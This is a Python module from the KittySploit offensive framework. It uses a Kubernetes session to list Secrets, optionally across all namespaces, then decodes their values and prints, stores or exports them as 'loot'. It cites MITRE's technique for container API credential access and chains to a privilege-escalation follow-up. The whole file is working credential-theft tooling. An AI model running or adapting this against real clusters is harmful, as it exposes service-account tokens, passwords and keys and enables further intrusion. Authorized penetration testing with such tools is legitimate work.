#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Kubernetes Secrets gather — list and optionally decode secret values."""

from kittysploit import *
from lib.protocols.kubernetes.kubernetes_session_mixin import KubernetesSessionMixin
import json


class Module(Post, KubernetesSessionMixin):
    __info__ = {
        "name": "Kubernetes List Secrets",
        "description": "Lists Secrets and optionally decodes data values (loot)",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "session_type": SessionType.KUBERNETES,
        "tags": ["kubernetes", "k8s", "cloud", "gather", "secrets", "loot"],
        "references": [
            "https://attack.mitre.org/techniques/T1552/007/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["credential_access", "api_request"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials"],
            "chain": {
                "consumes_capabilities": ["cloud_identity"],
                "produces_capabilities": [{"capability": "k8s_secrets", "from_detail": ""}],
                "suggested_followups": [
                    "post/kubernetes/analyze/rbac_privesc",
                ],
            },
        },
    }

    namespace = OptString("", "Namespace (empty = session default)", False)
    all_namespaces = OptBool(False, "List secrets across all namespaces", False)
    decode = OptBool(False, "Decode and display secret data values", False)
    secret_name = OptString("", "Fetch a single secret by name (implies decode)", False)
    label_selector = OptString("", "Label selector filter", False)
    max_decode = OptInteger(20, "Max secrets to fully fetch/decode", False)
    export_json = OptString("", "Optional output JSON file", False)
    store_results = OptBool(True, "Store results in session.data['secrets']", False)

    def check(self):
        sid = str(self.session_id or "").strip()
        if not sid:
            print_error("Session ID not set")
            return False
        session = self.framework.session_manager.get_session(sid) if self.framework else None
        if not session:
            print_error("Session not found")
            return False
        if str(session.session_type).lower() != SessionType.KUBERNETES.value:
            print_error(f"Session is not Kubernetes (type: {session.session_type})")
            return False
        try:
            self.open_kubernetes()
            return True
        except Exception as exc:
            print_error(str(exc))
            return False

    def run(self):
        client = self.open_kubernetes()
        ns = self.k8s_namespace(str(self.namespace or ""))
        all_ns = bool(self.all_namespaces)
        name = str(self.secret_name or "").strip()
        do_decode = bool(self.decode) or bool(name)

        entries = []
        if name:
            print_status(f"Fetching secret {ns}/{name}...")
            result = client.get_secret(name, namespace=ns)
            if not result.ok:
                print_error(result.error or f"HTTP {result.status_code}")
                return False
            entries = [self._summarize(result.body, decode=True)]
        else:
            print_status("Listing secrets..." + (" (all namespaces)" if all_ns else f" (ns={ns})"))
            result = client.list_secrets(
                namespace=ns,
                all_namespaces=all_ns,
                label_selector=str(self.label_selector or "").strip(),
            )
            if not result.ok:
                print_error(result.error or f"HTTP {result.status_code}")
                return False
            items = (result.body or {}).get("items") or []
            limit = max(1, int(self.max_decode or 20))
            for idx, item in enumerate(items):
                meta = item.get("metadata") or {}
                item_ns = meta.get("namespace") or ns
                item_name = meta.get("name", "")
                if do_decode and idx < limit:
                    full = client.get_secret(item_name, namespace=item_ns)
                    if full.ok:
                        entries.append(self._summarize(full.body, decode=True))
                        continue
                entries.append(self._summarize(item, decode=False))

        print_info("=" * 80)
        print_success(f"Found {len(entries)} secret(s)")
        for entry in entries:
            keys = ",".join(entry.get("keys") or []) or "-"
            print_info(
                f"  {entry.get('namespace')}/{entry.get('name')}  "
                f"type={entry.get('type')}  keys=[{keys}]"
            )
            if entry.get("decoded"):
                for key, value in entry["decoded"].items():
                    preview = value if len(value) < 120 else value[:120] + "..."
                    # redact obvious tokens slightly in console? User asked for loot — show values
                    print_warning(f"    {key} = {preview}")

        report = {
            "namespace": None if all_ns else ns,
            "all_namespaces": all_ns,
            "decoded": do_decode,
            "count": len(entries),
            "secrets": entries,
        }

        if bool(self.store_results):
            session = self._resolve_session()
            if session:
                data = session.data if isinstance(session.data, dict) else {}
                data["secrets"] = report
                session.data = data

        out = str(self.export_json or "").strip()
        if out:
            try:
                with open(out, "w", encoding="utf-8") as handle:
                    json.dump(report, handle, indent=2)
                print_success(f"Exported to {out}")
            except OSError as exc:
                print_error(f"Export failed: {exc}")

        return True

    def _summarize(self, item: dict, decode: bool) -> dict:
        meta = (item or {}).get("metadata") or {}
        data = (item or {}).get("data") or {}
        entry = {
            "name": meta.get("name", ""),
            "namespace": meta.get("namespace", ""),
            "type": (item or {}).get("type", ""),
            "keys": list(data.keys()),
        }
        if decode and data:
            from lib.protocols.kubernetes.kubernetes_client import KubernetesClient

            entry["decoded"] = KubernetesClient.decode_secret_data(data)
        return entry
